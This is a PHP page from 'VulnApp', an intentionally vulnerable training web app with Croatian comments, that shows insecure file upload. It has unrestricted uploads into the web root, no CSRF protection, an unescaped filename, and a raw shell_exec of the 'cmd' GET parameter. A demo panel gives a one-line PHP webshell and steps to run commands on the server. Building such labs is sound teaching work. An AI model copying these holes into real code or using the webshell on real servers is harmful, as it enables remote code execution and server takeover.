<?php
// ============================================================
//  VulnApp — upload.php
//  NAMJERNO RANJIVO:
//  - Nema provjere tipa datoteke (prihvaća .php, .exe, sve)
//  - Nema provjere MIME tipa
//  - Nema provjere veličine datoteke
//  - Datoteke se čuvaju u web rootu — direktno izvršljive
//  - Originalno ime datoteke se koristi direktno
//  - Nema CSRF zaštite
//  - Putanja do datoteke se otkriva korisniku
// ============================================================
session_start();

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

require_once 'db_connect.php';

$user_id  = $_SESSION['user_id'];
$username = $_SESSION['username'];

$msg_error   = '';
$msg_success = '';
$uploaded_path = '';

// ── Mapa za upload — u web rootu (RANJIVO!) ──────────────────
$upload_dir = __DIR__ . '/uploads/';

// RANJIVO: kreira upload mapu bez ikakve zaštite
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

// ── Upload obrada ─────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {

    $file     = $_FILES['upload'];
    $filename = $file['name']; // RANJIVO: originalno ime, bez sanitizacije

    // RANJIVO: nema NIKAKVE provjere tipa, ekstenzije ni veličine
    if ($file['error'] === UPLOAD_ERR_OK) {

        $dest = $upload_dir . $filename; // RANJIVO: predvidiva putanja

        if (move_uploaded_file($file['tmp_name'], $dest)) {
            // RANJIVO: otkriva punu putanju do uploadane datoteke
            $uploaded_path = 'uploads/' . $filename;
            $msg_success   = 'Datoteka uspješno uploadana: <code>' . $filename . '</code><br>'
                           . 'Dostupna na: <code>uploads/' . $filename . '</code>';
        } else {
            $msg_error = 'Greška pri uploadu datoteke.';
        }
    } else {
        $msg_error = 'Upload greška kod: ' . $file['error'];
    }
}

// ── Shell izvršavanje (ako je shell uploadan) ─────────────────
$shell_output = '';
$shell_file   = '';

if (isset($_GET['shell']) && isset($_GET['cmd'])) {
    // RANJIVO: direktno izvršava sistemsku naredbu bez ikakve provjere
    $shell_file = $_GET['shell'];
    $cmd        = $_GET['cmd'];
    $shell_output = shell_exec($cmd . ' 2>&1');
}

// ── Lista uploadanih datoteka ─────────────────────────────────
$uploaded_files = [];
if (is_dir($upload_dir)) {
    foreach (scandir($upload_dir) as $f) {
        if ($f !== '.' && $f !== '..') {
            $uploaded_files[] = $f;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="hr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>VulnApp — Upload datoteka</title>
  <link rel="stylesheet" href="../../css/vulnapp_upload_1.css"/>
</head>
<body>

<nav>
  <div class="nav-logo">Vuln<span>App</span></div>
  <ul class="nav-links">
    <li><a href="index.php">Početna</a></li>
    <li><a href="dashboard.php">Dashboard</a></li>
    <li><a href="upload.php">Upload</a></li>
  </ul>
  <div style="display:flex;align-items:center;gap:1rem;">
    <span class="nav-user">// <?= $username ?></span>
    <a href="logout.php" class="nav-logout">Odjava</a>
  </div>
</nav>

<div class="alert-banner">
  <div class="alert-dot"></div>
  Ranjiva aplikacija — File Upload bez ikakve zaštite
</div>

<div class="page">

  <div class="page-title">FILE UPLOAD</div>
  <p class="page-sub">// upload bez provjere tipa, veličine ili sadržaja datoteke</p>

  <div class="upload-grid">

    <!-- Upload forma -->
    <div class="panel">
      <div class="panel-title">
        Upload datoteke
        <span class="badge-red">⚠ Bez provjere</span>
      </div>

      <?php if ($msg_error):   ?>
        <div class="msg msg-error"><?= $msg_error ?></div>
      <?php endif; ?>

      <?php if ($msg_success): ?>
        <div class="msg msg-success"><?= $msg_success ?></div>
      <?php endif; ?>

      <!-- RANJIVO: nema CSRF tokena, accept="*" prima sve -->
      <form method="POST" enctype="multipart/form-data">
        <div class="drop-zone">
          <input type="file" name="upload" accept="*/*"/>
          <div class="drop-icon">📁</div>
          <div class="drop-text">
            <strong>Povuci datoteku ovdje ili klikni</strong>
            Prihvaća se SVE — .php, .exe, .sh, .js...
          </div>
          <div class="drop-hint">⚠ Nema filtriranja tipa datoteke</div>
        </div>
        <button type="submit" class="btn-upload">Upload datoteke</button>
      </form>

      <!-- WebShell simulator -->
      <?php if ($uploaded_path && str_ends_with($uploaded_path, '.php')): ?>
        <div class="shell-section">
          <div class="shell-label">WebShell — izvršavanje naredbi</div>
          <div class="shell-form">
            <input
              class="shell-input"
              type="text"
              id="cmd-input"
              placeholder="npr: dir  ili  whoami  ili  ipconfig"
            />
            <button class="btn-exec" onclick="execCmd()">Izvrši</button>
          </div>
          <div class="shell-output" id="shell-out">
            <?php if ($shell_output): ?>
              <?= htmlspecialchars($shell_output) ?>
            <?php else: ?>
              Čeka se naredba...
            <?php endif; ?>
          </div>
        </div>
      <?php endif; ?>

      <!-- Ranjivosti box -->
      <div class="vuln-box">
        <div class="vuln-box-title">⚠ Otkrivene ranjivosti</div>
        <div class="vuln-box-item"><strong>Nema provjere ekstenzije</strong> — .php, .exe, .sh sve prolazi</div>
        <div class="vuln-box-item"><strong>Nema provjere MIME tipa</strong> — content-type se ne provjerava</div>
        <div class="vuln-box-item"><strong>Nema ograničenja veličine</strong> — moguć DoS napad</div>
        <div class="vuln-box-item"><strong>Web root upload</strong> — datoteke su direktno dostupne i izvršljive</div>
        <div class="vuln-box-item"><strong>Originalno ime</strong> — predvidiva putanja do datoteke</div>
        <div class="vuln-box-item"><strong>Nema CSRF zaštite</strong> — forma bez tokena</div>
      </div>
    </div>

    <!-- Lista uploadanih datoteka -->
    <div class="panel">
      <div class="panel-title">
        Uploadane datoteke
        <span class="badge-red"><?= count($uploaded_files) ?> datoteka</span>
      </div>

      <div class="files-list">
        <?php if (empty($uploaded_files)): ?>
          <div class="file-empty">Nema uploadanih datoteka.</div>
        <?php else: ?>
          <?php foreach ($uploaded_files as $f): ?>
            <?php
              $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
              $is_php = $ext === 'php';
            ?>
            <div class="file-item">
              <div class="file-item-name">
                <?php if ($is_php): ?>
                  <!-- RANJIVO: direktan link do .php datoteke — izvršljiva! -->
                  <a href="uploads/<?= $f ?>?cmd=dir" target="_blank">
                    ⚠ <?= htmlspecialchars($f) ?>
                  </a>
                  <span style="font-size:.6rem;color:var(--red);display:block;margin-top:.2rem;">
                    Klikni → izvršava se kao PHP!
                  </span>
                <?php else: ?>
                  <a href="uploads/<?= htmlspecialchars($f) ?>" target="_blank">
                    <?= htmlspecialchars($f) ?>
                  </a>
                <?php endif; ?>
              </div>
              <span class="file-item-ext <?= $is_php ? 'php' : '' ?>">
                .<?= htmlspecialchars($ext) ?>
              </span>
            </div>
          <?php endforeach; ?>
        <?php endif; ?>
      </div>

      <!-- Upute za demonstraciju -->
      <div class="vuln-box" style="margin-top:1.5rem;">
        <div class="vuln-box-title">Demo — WebShell napad</div>
        <div class="vuln-box-item">
          <strong>Korak 1:</strong> Kreiraj datoteku <code style="color:#ff6b6b">shell.php</code> s:<br>
          <code style="color:#ff2d2d;font-size:.65rem">&lt;?php system($_GET['cmd']); ?&gt;</code>
        </div>
        <div class="vuln-box-item">
          <strong>Korak 2:</strong> Uploadaj shell.php kroz formu
        </div>
        <div class="vuln-box-item">
          <strong>Korak 3:</strong> Otvori u browseru:<br>
          <code style="color:#ff6b6b;font-size:.65rem">uploads/shell.php?cmd=whoami</code>
        </div>
        <div class="vuln-box-item">
          <strong>Korak 4:</strong> Dobivaš izvršavanje koda na serveru!
        </div>
      </div>
    </div>

  </div>
</div>

<script>
function execCmd() {
  const cmd = document.getElementById('cmd-input').value.trim();
  if (!cmd) return;
  // RANJIVO: šalje naredbu direktno serveru bez ikakve sanitizacije
  const shellFile = '<?= $uploaded_path ?>';
  window.location.href = shellFile + '?cmd=' + encodeURIComponent(cmd);
}

// Preview odabrane datoteke
document.querySelector('input[type="file"]').addEventListener('change', function() {
  const file = this.files[0];
  if (!file) return;
  const ext  = file.name.split('.').pop().toLowerCase();
  const hint = document.querySelector('.drop-hint');
  if (ext === 'php' || ext === 'exe' || ext === 'sh') {
    hint.style.color = '#ff0000';
    hint.textContent = '⚠ OPASNA DATOTEKA — .php/.exe/.sh će biti prihvaćena!';
  } else {
    hint.textContent = 'Odabrano: ' + file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
  }
});
</script>

</body>
</html>
